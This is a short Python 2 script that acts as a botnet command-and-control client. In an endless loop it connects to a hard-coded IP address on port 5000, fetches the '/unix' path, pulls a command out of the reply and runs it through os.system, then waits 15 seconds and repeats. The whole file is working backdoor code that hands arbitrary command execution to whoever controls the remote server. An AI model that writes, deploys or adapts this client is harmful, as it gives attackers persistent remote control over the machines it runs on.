import socket
import os
import time

HOST = '140.114.71.175'    # The remote host
PORT = 5000                # The same port as used by the server
GET = '/unix'


def getcmd(string):
    response = string.split('\r\n')
    # print 'Received:', response
    return response[-1].strip('\n').rstrip('"').lstrip('"')


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" % (GET, HOST))
    data = s.recv(1024)
    string = ""

    while len(data):
        string = string + data
        data = s.recv(1024)
    s.close()

    command = getcmd(string)

    print 'Execute %s' % command
    os.system(command)

if __name__ == "__main__":
    while True:
        print "=== Connect to C&C Server ==="
        main()
        print "Wait for 15 seconds..."
        time.sleep(15)
